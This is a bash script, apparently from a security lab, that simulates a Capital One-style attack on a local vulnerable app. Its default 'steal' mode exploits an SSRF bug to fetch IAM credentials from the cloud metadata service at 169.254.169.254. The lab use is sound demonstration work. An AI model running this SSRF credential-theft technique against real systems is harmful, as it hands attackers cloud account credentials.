#!/usr/bin/env bash
# Simulates the attacker side of the Capital One scenario against the local lab.
#
#   benign  -> asks the metadata service for the harmless instance-id
#   steal   -> abuses the SSRF bug to make the app fetch IAM credentials
#
# Both go through the vulnerable app's /fetch endpoint (server-side request).
set -u
APP="http://127.0.0.1:8080/fetch"
IMDS="http://169.254.169.254"
ROLE="credguard-demo-role"

mode="${1:-steal}"
case "$mode" in
  benign)
    echo "[attack] benign request: instance-id via SSRF"
    curl -s --get "$APP" --data-urlencode "url=$IMDS/latest/meta-data/instance-id"
    echo
    ;;
  steal)
    echo "[attack] CREDENTIAL THEFT: IAM security-credentials via SSRF"
    curl -s --get "$APP" \
      --data-urlencode "url=$IMDS/latest/meta-data/iam/security-credentials/$ROLE"
    echo
    ;;
  *)
    echo "usage: $0 {benign|steal}" >&2; exit 2;;
esac
